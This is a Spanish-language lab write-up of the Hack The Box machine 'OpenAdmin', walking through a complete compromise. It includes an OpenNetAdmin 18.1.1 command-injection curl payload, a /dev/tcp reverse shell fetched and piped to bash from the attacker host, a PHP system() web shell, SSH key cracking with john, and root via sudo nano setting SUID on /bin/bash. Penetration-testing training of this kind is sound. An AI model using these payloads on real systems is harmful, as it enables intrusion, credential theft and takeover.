---
layout: post
title: HTB_OpenAdmin
date: 2023/07/10
slug: HTB_OpenAdmin
heroImage: /assets/machines.jpg
---

# OpenAdmin {-}

## Introduccion {-}

La maquina del dia se llama OpenAdmin.

El replay del live se puede ver aqui

[![S4vitaar OpenAdmin maquina](https://img.youtube.com/vi/0vmm0I644fs/0.jpg)](https://www.youtube.com/watch?v=0vmm0I644fs)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.171
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.171
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.171 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.171 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | tcp      | Web, Fuzzing       |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.171
```

Es un Apache 2.4.29 en un Ubuntu. 


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.171 
```
, Vemos la Apache2 default page.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.171/FUZZ
```

Vemos un directorio 
```bash
 /arcwork 
```
 que no nos muestra gran cosa. Tambien vemos un directorio 
```bash
 /music 
```
 y vemos que el login nos lleva a un directorio

```bash
 /ona 
```


Pinchamos y llegamos a un panel de administracion de 
```bash
 opennetadmin 
```

## Vulnerability Assessment {-}


### opennetadmin {-}

```bash
searchsploit opennetadmin
```

Aqui vemos un exploit en bash para para el opennetadmin 18.1.1 y en la web estamos frente a uno de esta misma version

```bash
searchsploit -x 47691
```

Vemos que es un simple oneliner que envia con curl una peticion por POST. Intentamos con un whoami

```bash
curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";whoami;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 | html2text
```

Vemos que esto funcciona sin problemas. Intentamos ver si tenemos conectividad con la maquina.

1. Lanzamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. Lanzamos una peticion curl a nuestra maquina

    ```bash
    curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";curl 10.10.14.8;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
    ```

Como hemos recibido la peticion get, intentamos ganar accesso al systema.## Vuln exploit & Gaining Access {-}

### Ganando accesso con curl al opennetadmin {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos un fichero index.html con codigo bash

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. Lanzamos el curl con reverseshell

    ```bash
    curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";curl 10.10.14.8|bash;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
    ```

Ya hemos ganado accesso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting {-}

```bash
ls
grep -r -i -E "user|pass|key|database"
grep -r -i -E "user|pass"
cd /home
find \-name user.txt 2>/dev/null
find \-name user.txt
id
sudo -l
cd /var/www
ls -la
cd internal
cd /opt/ona/www
ls
find \-type f 2>/dev/null | grep "config"
```

Aqui no hemos podido entrar en los directorios de los usuarios, y en el directorio internal del 
```bash
 /var/www 
```
. Hemos visto
quel directorio 
```bash
 /var/www/ona 
```
 era un link symbolico a 
```bash
 /opt/ona/www 
```
 y buscando por archivos conteniendo config en su nombre,
hemos caido en un fichero 
```bash
 database_settings.inc.php 
```
 que contiene credenciales.

```bash
grep "sh$" /etc/passwd
su jimmy
Password: 
```

Hemos podido conectarnos como el usuario **jimmy** pero la flag no esta en su directorio de usuario. Parece que tenemos que convertirnos
en el usuario **joanna**.

```bash
id
```

Aqui vemos quel usuario es parte del grupo **internal**. Miramos lo que hay en el directorio 
```bash
 /var/www/internal 
```


```bash
cd /var/www/internal
ls -la
cat main.php
```

Vemos que en la web de internal se podria ver el id_rsa de joanna. Miramos la configuracion de esta web

```bash
cd /etc/apache2/sites-available
cat internal.conf
```

Aqui vemos que hay una web montada en local por el puerto 52846. Lo mas interesante aqui es quel usuario joanna a sido asignada
como AssignUserID de este servicio. Intentamos comprometer este servicio, directamente desde la maquina victima.

```bash
cd /var/www/internal
curl localhost:52846
```

Aqui vemos que podemos acceder a la web internal.

1. creamos un nuevo fichero s4vishell.php

    ```php
    <?php
        system("whoami");
    ?>
    ```

1. lanzamos una peticion get a este fichero

    ```bash
    curl localhost:52846/s4vishell.php
    #Output
    joanna
    ```

En el fichero 
```bash
 main.php 
```
 vemos que hace un echo de la id_rsa de joanna. Lo miramos con curl

```bash
curl localhost:52846/main.php
```

copiamos la key en un fichero joanna_rsa en nuestra maquina de ataquante y nos connectamos con ssh

```bash
chmod 600 joanna_rsa
ssh joana@10.10.10.171 -i joanna_rsa
```

Aqui vemos que la id_rsa esta protegida por una contraseña. Crackeamos la llave.

#### Crackeamos la id_rsa con ssh2john {-}

```bash
/usr/share/john/ssh2john.py joanna_rsa > hash
john --wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui ya tenemos la contraseña de la id_rsa de joanna y nos podemos conectar

```bash
ssh -i joanna_rsa joanna@10.10.10.171
Enter passphrase
```

y ya podemos leer la flag.

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Aqui vemos que podemos ejecutar nano /opt/priv como el usuario root sin proporcionar contraseña.

```bash
sudo -u root nano /opt/priv

Ctrl+r
Ctrl+x

chmod 4755 /bin/bash

Enter
```

Ya podemos ver que la 
```bash
 /bin/bash 
```
 tiene privilegios SUID y que podemos convertirnos en root para leer la flag

```bash
ls -la /bin/bash
bash -p
whoami
#Output
root
```
